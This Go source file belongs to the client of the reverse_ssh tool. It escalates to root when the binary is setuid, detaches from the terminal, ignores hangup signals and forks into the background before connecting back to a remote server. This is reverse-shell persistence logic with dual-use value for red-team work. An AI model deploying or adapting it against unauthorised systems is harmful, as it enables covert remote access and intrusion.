//go:build !windows

package main

import (
	"log"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func setPermissionsAndRun(destination, fingerprint, proxyaddress string, rc bool) {
	//Try to elavate to root (in case we are a root:root setuid/gid binary)
	syscall.Setuid(0)
	syscall.Setgid(0)

	//Create our own process group, and ignore any  hang up, or child signals
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP)
	signal.Ignore(syscall.SIGCHLD)

	client.Run(destination, fingerprint, proxyaddress, rc)
}

func runOrFork(destination, fingerprint, proxyaddress string, fg, dt, rc bool) {
	if fg {
		setPermissionsAndRun(destination, fingerprint, proxyaddress, rc)
		return
	}

	argv := []string{}
	if len(os.Args) > 1 {
		argv = os.Args[1:]
	}

	log.Println("Forking")
	cmd := exec.Command("/proc/self/exe", append([]string{"--foreground"}, argv...)...)
	err := cmd.Start()
	if err != nil {
		log.Println("Forking from /proc/self/exe failed")

		binary, err := os.Executable()
		if err != nil {
			log.Println("Unable to get executable path")

			setPermissionsAndRun(destination, fingerprint, proxyaddress, rc)
		}

		cmd = exec.Command(binary, append([]string{"--foreground"}, argv...)...)
		err = cmd.Start()
		if err != nil {
			log.Println("Forking from argv[0] failed")

			setPermissionsAndRun(destination, fingerprint, proxyaddress, rc)
			return
		}
	}

	cmd.Process.Release()

}
